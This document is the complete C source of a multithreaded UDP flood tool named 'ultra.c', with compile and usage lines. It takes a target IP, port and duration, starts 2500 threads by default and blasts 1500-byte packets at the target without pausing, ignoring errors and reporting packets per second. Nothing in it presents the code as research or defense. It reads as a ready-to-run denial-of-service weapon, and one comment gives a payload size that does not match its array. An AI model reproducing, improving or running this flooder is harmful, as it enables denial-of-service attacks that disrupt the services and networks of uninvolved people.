// ultra.c – UDP flooder (macOS/Linux compatible)
// Compile: gcc -pthread -O3 -o ultra ultra.c
// Usage: ./ultra <IP> <PORT> <TIME_SEC> [THREADS]
// Default: 2500 threads, 1500-byte packets

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>

#define DEFAULT_THREADS 2500
#define PACKET_SIZE 1500

volatile int running = 1;
unsigned long long total_packets = 0;
pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;
time_t start_time;

// Your custom payload (68 bytes)
const unsigned char original_payload[] = 
    "\x1\xfa\x83\x78\x4e\xc9\x25\x5d\xb7\x92\xfe\x67\xeb\x3a\x70\xb4"
    "\xde\xec\xbf\x09\x58\x86\x62\xb8\x58\x17\xb2\xcb\x1c\x8f\xae\x04"
    "\x2f\xba\x2e\x55\xf3\x26\xc9\x37\x36\xea\x9e\xfb\xb2\xce\x28\x7d"
    "\x97\x13\x45\xf5\xcb\xcd\x3f\xb9\x62\x0b\xff\x02\x69\xdb\x4a\x33"
    "\x52\x83\x67\x1e\x94\xdc\x35\xeb\x20\x94\xcd\xfb\x70\xae\xd3\xb8"
    "\x9c\xbc\xe6\xa6\x61\x73\x18\x46\x18\x5b\xc3\xac\x29\x79\xa6\xbb"
    "\xed\xea\x59\x38\x1c\xa8\x8a\x45\x53\xc0\x06\xea\xbf\x33\x81\xa2"
    "\x35\xb6\x70\x32\x88\xa7\x27\xca\x7e\xcb\xb1\xe3\xee\x34\x5d\xf9"
    "\x49\x9c\x53\xd7\x4f\x71\xcb\x62\xdc\x5e\xd4\x60\x8e\x2e\x9b\x36"
    "\xc6\x11\x26\xa4\xae\x54\x34\xbb\xb3\xbe\xd9\x4b\xaf\x28\x8a\x84"
    "\xae\x17";

const size_t original_len = sizeof(original_payload) - 1;
unsigned char full_payload[PACKET_SIZE];

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} thread_data_t;

void build_payload() {
    memcpy(full_payload, original_payload, original_len);
    memset(full_payload + original_len, 'X', PACKET_SIZE - original_len);
}

void sigint_handler(int sig) {
    running = 0;
}

void* send_loop(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    int sock;
    struct sockaddr_in target;
    unsigned long long local_counter = 0;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket");
        return NULL;
    }

    // Non-blocking for speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    if (inet_pton(AF_INET, data->ip, &target.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return NULL;
    }

    time_t end_time = time(NULL) + data->duration;

    while (running && time(NULL) <= end_time) {
        if (sendto(sock, full_payload, PACKET_SIZE, 0,
                   (struct sockaddr*)&target, sizeof(target)) < 0) {
            // ignore errors, keep sending
        }
        local_counter++;
    }

    close(sock);

    pthread_mutex_lock(&counter_mutex);
    total_packets += local_counter;
    pthread_mutex_unlock(&counter_mutex);

    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        printf("Usage: %s <IP> <PORT> <TIME_SEC> [THREADS]\n", argv[0]);
        printf("Default threads = %d, packet size = %d bytes\n", DEFAULT_THREADS, PACKET_SIZE);
        return 1;
    }

    build_payload();

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = DEFAULT_THREADS;

    if (argc == 5) {
        threads = atoi(argv[4]);
        if (threads <= 0) threads = DEFAULT_THREADS;
    }

    if (duration <= 0 || port <= 0) {
        printf("Error: PORT and TIME must be positive.\n");
        return 1;
    }

    signal(SIGINT, sigint_handler);

    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║     UDP FLOODER (macOS/Linux compatible)   ║\n");
    printf("╚════════════════════════════════════════════╝\n");
    printf("Target: %s:%d\n", ip, port);
    printf("Duration: %d sec | Threads: %d\n", duration, threads);
    printf("Packet size: %d bytes\n", PACKET_SIZE);
    printf("Press Ctrl+C to stop.\n\n");

    pthread_t* tids = malloc(threads * sizeof(pthread_t));
    thread_data_t* thread_args = malloc(threads * sizeof(thread_data_t));
    if (!tids || !thread_args) {
        perror("malloc");
        return 1;
    }

    start_time = time(NULL);
    for (int i = 0; i < threads; i++) {
        strcpy(thread_args[i].ip, ip);
        thread_args[i].port = port;
        thread_args[i].duration = duration;
        thread_args[i].thread_id = i + 1;
        if (pthread_create(&tids[i], NULL, send_loop, &thread_args[i]) != 0) {
            perror("pthread_create");
            free(tids);
            free(thread_args);
            return 1;
        }
    }

    unsigned long long last_total = 0;
    while (running && (time(NULL) - start_time) < duration) {
        sleep(1);
        unsigned long long current;
        pthread_mutex_lock(&counter_mutex);
        current = total_packets;
        pthread_mutex_unlock(&counter_mutex);
        unsigned long long delta = current - last_total;
        double mbps = (delta * PACKET_SIZE * 8) / 1000000.0;
        printf("\r📊 Rate: %llu pps | %.2f Mbps | Total: %llu   ", delta, mbps, current);
        fflush(stdout);
        last_total = current;
    }

    running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }

    printf("\n\n========================================\n");
    printf("✅ Final: %llu packets in %d sec\n", total_packets, duration);
    if (duration > 0) printf("Average rate: %llu pps\n", total_packets / duration);
    printf("========================================\n");

    free(tids);
    free(thread_args);
    return 0;
}
